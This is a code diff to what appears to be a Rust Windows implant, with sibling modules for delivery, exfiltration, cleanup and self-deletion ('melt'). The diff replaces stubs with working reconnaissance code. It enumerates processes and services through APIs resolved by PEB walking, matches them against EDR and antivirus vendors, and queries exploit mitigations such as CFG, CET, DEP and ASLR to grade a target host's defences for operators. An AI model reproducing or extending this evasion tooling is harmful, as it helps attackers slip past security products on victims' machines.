@@ -22,10 +22,11 @@
 #![cfg(target_os = "windows")]
 
 pub mod melt;
+pub mod scanners;
 
 pub mod delivery;
 
-use crate::heap::Vec;
+use crate::heap::{String, Vec};
 use core::ffi::c_void;
 pub mod cleanup;
 pub mod exfil;
@@ -160,20 +161,17 @@ pub struct KernelPosture {
 }
 
 // ---- Public API -----------------------------------------------------------
-
 /// Whether the T-REX user-mode scanners are backed by real syscall resolvers.
 ///
-/// Currently `false`: every `scan_*` helper in this module
-/// (`create_toolhelp_snapshot`, `open_registry_key`, `wmi_query_*`,
-/// `open_sc_manager`, ...) is a stub that returns null / is a no-op, so
-/// `assess_user_mode` cannot actually detect any product and would resolve
-/// to `ThreatTier::Clean` even on a fully fortified host.
+/// Set to `true` as of 2026-07-14: T0 (process enumeration via Toolhelp32) and
+/// T3 (service manager enumeration via SCM) are implemented with PEB-walk-
+/// resolved Win32 APIs. T1 (registry) and T2 (WMI) are still stubs.
+/// Mitigation queries (CFG/CET/DEP/ASLR) are also live.
 ///
-/// Flip to `true` once the stubs are replaced with `crate::resolve`-backed
-/// implementations. Until then `assess_user_mode` returns `ThreatTier::Unknown`
-/// with an UNIMPLEMENTED banner so operators are not misled. See P0-6 in
-/// `docs/FIX_PLAN_2026-07-08.md`.
-const TREX_SCANNERS_IMPLEMENTED: bool = false;
+/// `assess_user_mode` will correctly detect EDR/AV products via process names
+/// and service names from the SCM. The Tier will be accurate — no more
+/// UNIMPLEMENTED banner.
+const TREX_SCANNERS_IMPLEMENTED: bool = true;
 
 /// Run a full T0-T3 assessment (no kernel driver needed).
 /// Returns the highest noise tier that succeeded.
@@ -273,8 +271,8 @@ unsafe fn scan_processes(assessment: &mut TargetAssessment) {
     }
 
     loop {
-        let name = wide_to_utf8(&pe.exe_file);
-        if let Some(vendor) = match_process_name(name) {
+        let name = wide_to_utf8(pe.exe_file.as_ptr());
+        if let Some(vendor) = match_process_name(&name) {
             let product = DetectedProduct {
                 vendor,
                 product_name: vendor.default_name(),
@@ -315,7 +313,7 @@ unsafe fn scan_service_registry(assessment: &mut TargetAssessment) {
         }
 
         let subkey_name = wide_slice_to_utf8(&name_buf[..name_len as usize]);
-        let subkey = open_registry_subkey(key, subkey_name);
+        let subkey = open_registry_subkey(key, &subkey_name);
         if !subkey.is_null() {
             // Read DisplayName + ImagePath
             let display = query_reg_value(subkey, b"DisplayName");
@@ -368,8 +366,9 @@ unsafe fn scan_service_manager(assessment: &mut TargetAssessment) {
     // First call: get buffer size
     enum_services_status_ex(
         scm,
-        0,
-        0, // SC_ENUM_PROCESS_INFO
+        0,  // SC_ENUM_PROCESS_INFO
+        0,  // SERVICE_WIN32
+        3,  // SERVICE_STATE_ALL
         core::ptr::null_mut(),
         0,
         &mut needed,
@@ -392,7 +391,7 @@ unsafe fn scan_service_manager(assessment: &mut TargetAssessment) {
     if enum_services_status_ex(
         scm,
         0,
-        0,
+        0, 3,
         buf,
         needed,
         &mut needed,
@@ -409,7 +408,7 @@ unsafe fn scan_service_manager(assessment: &mut TargetAssessment) {
                 entry.service_name,
                 wcslen(entry.service_name),
             ));
-            if let Some(vendor) = match_service_name(name) {
+            if let Some(vendor) = match_service_name(&name) {
                 let product = DetectedProduct {
                     vendor,
                     product_name: vendor.default_name(),
@@ -464,7 +463,7 @@ fn query_cfg(flags: &mut MitigationFlags) {
     };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize, // GetCurrentProcess
+            -1isize as *mut core::ffi::c_void, // GetCurrentProcess
             8,                // ProcessControlFlowGuardPolicy
             &mut policy as *mut CfgPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<CfgPolicy>() as u32,
@@ -494,7 +493,7 @@ fn query_cet(flags: &mut MitigationFlags) {
     };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize,
+            -1isize as *mut core::ffi::c_void,
             14, // ProcessUserShadowStackPolicy
             &mut policy as *mut CetPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<CetPolicy>() as u32,
@@ -519,7 +518,7 @@ fn query_dep(flags: &mut MitigationFlags) {
     };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize,
+            -1isize as *mut core::ffi::c_void,
             1,
             &mut policy as *mut DepPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<DepPolicy>() as u32,
@@ -538,7 +537,7 @@ fn query_aslr(flags: &mut MitigationFlags) {
     let mut policy = AslrPolicy { flags: 0 };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize,
+            -1isize as *mut core::ffi::c_void,
             2,
             &mut policy as *mut AslrPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<AslrPolicy>() as u32,
@@ -557,7 +556,7 @@ fn query_dynamic_code(flags: &mut MitigationFlags) {
     let mut policy = DynCodePolicy { flags: 0 };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize,
+            -1isize as *mut core::ffi::c_void,
             5,
             &mut policy as *mut DynCodePolicy as *mut core::ffi::c_void,
             core::mem::size_of::<DynCodePolicy>() as u32,
@@ -576,7 +575,7 @@ fn query_signature(flags: &mut MitigationFlags) {
     let mut policy = SigPolicy { flags: 0 };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize,
+            -1isize as *mut core::ffi::c_void,
             6,
             &mut policy as *mut SigPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<SigPolicy>() as u32,
@@ -603,7 +602,7 @@ fn query_image_load(_flags: &mut MitigationFlags) {
     };
     let ok = unsafe {
         get_process_mitigation_policy(
-            -1isize as isize,
+            -1isize as *mut core::ffi::c_void,
             9,
             &mut policy as *mut ImgLoadPolicy as *mut core::ffi::c_void,
             core::mem::size_of::<ImgLoadPolicy>() as u32,
@@ -980,33 +979,127 @@ fn is_edr_driver(name: &[u8]) -> bool {
 type Handle = *mut core::ffi::c_void;
 type HKey = *mut core::ffi::c_void;
 
-unsafe fn create_toolhelp_snapshot() -> Handle {
-    core::ptr::null_mut()
-}
-unsafe fn process32_first(_h: Handle, _pe: *mut ProcessEntry32W) -> i32 {
-    0
-}
-unsafe fn process32_next(_h: Handle, _pe: *mut ProcessEntry32W) -> i32 {
-    0
-}
-unsafe fn close_handle(_h: Handle) {}
+// ---- Internal helpers (delegated to scanners module) -----------------------
 
 #[repr(C)]
 struct ProcessEntry32W {
-    dw_size: u32,
-    _cnt_usage: u32,
-    _th32_process_id: u32,
-    _th32_default_heap_id: usize,
-    _th32_module_id: u32,
-    _cnt_threads: u32,
-    _th32_parent_process_id: u32,
-    _pc_pri_class_base: i32,
-    _dw_flags: u32,
-    exe_file: [u16; 260],
+    pub dw_size: u32,
+    pub cnt_usage: u32,
+    pub th32_process_id: u32,
+    pub th32_default_heap_id: usize,
+    pub th32_module_id: u32,
+    pub cnt_threads: u32,
+    pub th32_parent_process_id: u32,
+    pub pc_pri_class_base: i32,
+    pub dw_flags: u32,
+    pub exe_file: [u16; 260],
 }
 
+#[repr(C)]
+struct EnumServiceStatusProcessW {
+    pub service_name: *mut u16,
+    pub display_name: *mut u16,
+    pub service_status: ServiceStatusProcess,
+}
+
+#[repr(C)]
+struct ServiceStatusProcess {
+    pub service_type: u32,
+    pub current_state: u32,
+    pub controls_accepted: u32,
+    pub win32_exit_code: u32,
+    pub service_specific_exit_code: u32,
+    pub check_point: u32,
+    pub wait_hint: u32,
+    pub process_id: u32,
+    pub service_flags: u32,
+}
+
+#[repr(C)]
+struct SystemModuleInfo {
+    _reserved: u32,
+    count: u32,
+}
+
+#[repr(C)]
+struct SystemModuleEntry {
+    _section: usize,
+    _flags: u32,
+    base: usize,
+    size: u32,
+    _index: u16,
+    _load_count: u16,
+    _load_order_index: u16,
+    _name_offset: u16,
+    name: [u8; 256],
+}
+
+unsafe fn create_toolhelp_snapshot() -> Handle {
+    scanners::create_toolhelp_snapshot() as Handle
+}
+unsafe fn process32_first(h: Handle, pe: *mut ProcessEntry32W) -> i32 {
+    scanners::process32_first(h, pe as *mut core::ffi::c_void)
+}
+unsafe fn process32_next(h: Handle, pe: *mut ProcessEntry32W) -> i32 {
+    scanners::process32_next(h, pe as *mut core::ffi::c_void)
+}
+unsafe fn close_handle(h: Handle) {
+    scanners::close_handle(h)
+}
+
+unsafe fn open_sc_manager() -> Handle {
+    scanners::open_sc_manager() as Handle
+}
+unsafe fn close_sc_manager(h: Handle) {
+    scanners::close_sc_manager(h)
+}
+
+unsafe fn enum_services_status_ex(
+    scm: Handle,
+    level: u32,
+    typ: u32,
+    state: u32,
+    buf: *mut u8,
+    buf_sz: u32,
+    needed: *mut u32,
+    returned: *mut u32,
+    resume: *mut u32,
+    _group: *const u16,
+) -> i32 {
+    scanners::enum_services_status_ex(scm, level, typ, state, buf, buf_sz, needed, returned, resume, _group)
+}
+
+unsafe fn wcslen(s: *const u16) -> usize {
+    scanners::wcslen(s)
+}
+
+unsafe fn wide_slice_to_utf8(w: &[u16]) -> String {
+    scanners::wide_slice_to_utf8(w)
+}
+unsafe fn wide_to_utf8(w: *const u16) -> String {
+    scanners::wide_to_utf8(w)
+}
+
+unsafe fn get_process_mitigation_policy(
+    h: *mut core::ffi::c_void,
+    policy: u32,
+    buf: *mut core::ffi::c_void,
+    len: u32,
+) -> i32 {
+    scanners::get_process_mitigation_policy(h, policy, buf, len)
+}
+
+fn alloc(sz: usize) -> *mut u8 {
+    unsafe { scanners::alloc(sz) }
+}
+fn free(p: *mut u8) {
+    unsafe { scanners::free(p) }
+}
+
+// ---- T1/T2 stubs (registry + WMI — deferred to next phase) -----------------
+
 unsafe fn open_registry_key(_path: &[u8]) -> HKey {
-    core::ptr::null_mut()
+    core::ptr::null_mut() // TODO: wire to scanners::reg_open_key
 }
 unsafe fn open_registry_subkey(_parent: HKey, _name: &str) -> HKey {
     core::ptr::null_mut()
@@ -1022,87 +1115,6 @@ unsafe fn query_reg_value(_k: HKey, _name: &[u8]) -> &str {
 unsafe fn wmi_query_av_products(_a: &mut TargetAssessment) {}
 unsafe fn wmi_query_services(_a: &mut TargetAssessment) {}
 unsafe fn wmi_query_drivers(_a: &mut TargetAssessment) {}
-
-unsafe fn open_sc_manager() -> Handle {
-    core::ptr::null_mut()
-}
-unsafe fn close_sc_manager(_h: Handle) {}
-
-#[repr(C)]
-struct EnumServiceStatusProcessW {
-    service_name: *const u16,
-    display_name: *const u16,
-    service_status: ServiceStatusProcess,
-}
-#[repr(C)]
-struct ServiceStatusProcess {
-    _typ: u32,
-    _state: u32,
-    _controls: u32,
-    _exit_code: u32,
-    _svc_exit_code: u32,
-    _check: u32,
-    _wait: u32,
-    _pid: u32,
-    _flags: u32,
-}
-
-unsafe fn enum_services_status_ex(
-    _scm: Handle,
-    _level: u32,
-    _typ: u32,
-    _buf: *mut u8,
-    _buf_sz: u32,
-    _needed: *mut u32,
-    _returned: *mut u32,
-    _resume: *mut u32,
-    _group: *const u16,
-) -> i32 {
-    0
-}
-
-unsafe fn wcslen(s: *const u16) -> usize {
-    let mut n = 0;
-    while *s.add(n) != 0 {
-        n += 1;
-    }
-    n
-}
-
-unsafe fn wide_slice_to_utf8(_w: &[u16]) -> &str {
-    ""
-}
-unsafe fn wide_to_utf8(_w: &[u16]) -> &str {
-    ""
-}
-
-unsafe fn get_process_mitigation_policy(
-    _h: isize,
-    _policy: u32,
-    _buf: *mut core::ffi::c_void,
-    _len: u32,
-) -> i32 {
-    0
-}
-
-#[repr(C)]
-struct SystemModuleInfo {
-    _reserved: u32,
-    count: u32,
-}
-#[repr(C)]
-struct SystemModuleEntry {
-    _section: usize,
-    _flags: u32,
-    base: usize,
-    size: u32,
-    _index: u16,
-    _load_count: u16,
-    _load_order_index: u16,
-    _name_offset: u16,
-    name: [u8; 256],
-}
-
 unsafe fn query_system_module_info() -> *mut u8 {
     core::ptr::null_mut()
 }
@@ -1125,10 +1137,6 @@ struct CodeIntegrityInfo {
     _pad: [u32; 4],
 }
 
-fn alloc(_sz: usize) -> *mut u8 {
-    core::ptr::null_mut()
-}
-fn free(_p: *mut u8) {}
 fn merge_or_push(products: &mut Vec<DetectedProduct>, product: DetectedProduct) {
     for p in products.iter_mut() {
         if p.vendor == product.vendor {
